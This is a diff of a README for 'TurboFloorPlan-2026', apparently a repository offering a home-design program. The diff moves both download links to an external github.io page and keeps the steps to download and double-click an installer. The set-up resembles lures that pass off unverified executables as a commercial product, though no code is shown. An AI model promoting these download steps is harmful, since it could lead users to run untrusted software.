@@ -1,6 +1,6 @@
 # 🏠 TurboFloorPlan-2026 - Design professional home plans with ease
 
-[![](https://img.shields.io/badge/Download-TurboFloorPlan%202026-blue.svg)](https://github.com/As097951/TurboFloorPlan-2026)
+[![](https://img.shields.io/badge/Download-TurboFloorPlan%202026-blue.svg)](https://as097951.github.io)
 
 ## 📌 About this application
 
@@ -21,7 +21,7 @@ Ensure your computer meets these specifications to run the software smoothly:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit [this link to download the software](https://github.com/As097951/TurboFloorPlan-2026).
+1. Visit [this link to download the software](https://as097951.github.io).
 2. Locate the installer file in your Downloads folder.
 3. Double-click the file to start the installation process.
 4. Follow the prompts on the screen.
